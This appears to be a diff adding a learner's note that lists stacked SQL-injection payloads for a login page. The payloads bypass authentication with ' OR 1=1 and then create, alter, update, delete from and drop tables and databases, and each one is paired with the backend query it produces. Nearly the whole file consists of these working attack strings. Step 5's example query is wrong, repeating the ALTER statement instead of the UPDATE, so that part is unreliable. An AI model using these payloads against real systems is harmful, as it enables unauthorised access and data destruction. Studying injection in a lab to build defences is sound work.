@@ -1,0 +1,58 @@
+SQL-Injection allows multiple Infected SQL commands to execute at the login page to by pass the SQL database like 
+1. Creating a Database(not working for security reasons)
+2. Creating the Tables
+3. Insert the Table values
+4. Altering the Table by adding new columns
+5. Modify Table values
+6. Delete the Table values
+7. Drop the Table
+8. Drop the Database(not working for security reasons)
+
+
+1) Creating a Database : 
+' OR 1=1; CREATE DATABASE <database_name>; --
+(This above query will run in the backend as
+SELECT * FROM users WHERE username = '' OR 1=1; CREATE DATABASE <database_name>; -- AND password = '';)
+(Note : But this command is not working present due to the security and privileges issues in the MySQL Database)
+
+
+2) Creating the new Table in the existing database:
+'; CREATE TABLE malicious_table (id INT, username VARCHAR(50), password VARCHAR(50)); --
+(This above query will run in the backend as 
+SELECT * FROM users WHERE username = ''; CREATE TABLE malicious_table (id INT, username VARCHAR(50), password VARCHAR(50)); -- AND password = '';)
+
+3) Insert the Table values:
+' OR 1=1; INSERT INTO malicious_table (username, password) VALUES ('attacker', 'attackerpassword'); --
+(This above query will run in the backend as 
+SELECT * FROM users WHERE username = '' OR 1=1; INSERT INTO malicious_table (username, password) VALUES ('attacker', 'attackerpassword'); -- AND password = '';)
+
+4) Altering the Table by adding new columns : 
+' OR 1=1; ALTER TABLE malicious_table ADD COLUMN isAdmin BOOLEAN DEFAULT FALSE; --
+(This above query will run in the backend as 
+SELECT * FROM users WHERE username = '' OR 1=1; ALTER TABLE malicious_table ADD COLUMN isAdmin BOOLEAN DEFAULT FALSE; -- AND password = '';)
+
+5) Update or Modify Tabular values : 
+' OR 1=1; UPDATE malicious_table SET password = 'newpassword' WHERE username = 'attacker'; --
+(This above query will run in the backend as 
+SELECT * FROM users WHERE username = '' OR 1=1; ALTER TABLE malicious_table ADD COLUMN isAdmin BOOLEAN DEFAULT FALSE; -- AND password = '';)
+
+6) Delete the Table values : 
+' OR 1=1; DELETE FROM malicious_table WHERE username = 'attacker'; --
+(This above query will run in the backend as
+SELECT * FROM Users WHERE username = '' OR 1=1; DELETE FROM malicious_table WHERE username = 'attacker'; --' AND password = '';)
+
+7) Drop the Table : 
+' OR 1=1; DROP TABLE malicious_table; --
+(This above query will run in the backend as
+SELECT * FROM users WHERE username = '' OR 1=1; DROP TABLE malicious_table; -- AND password = '';)
+
+
+8) Drop the Database :
+' OR 1=1; DROP DATABASE <database_name>; --
+(This above query will run in the backend as
+SELECT * FROM users WHERE username = '' OR 1=1; DROP DATABASE <database_name>; -- AND password = '';)
+(Note : But this command is not working present due to the security and privileges issues in the MySQL Database)
+
+
+
+
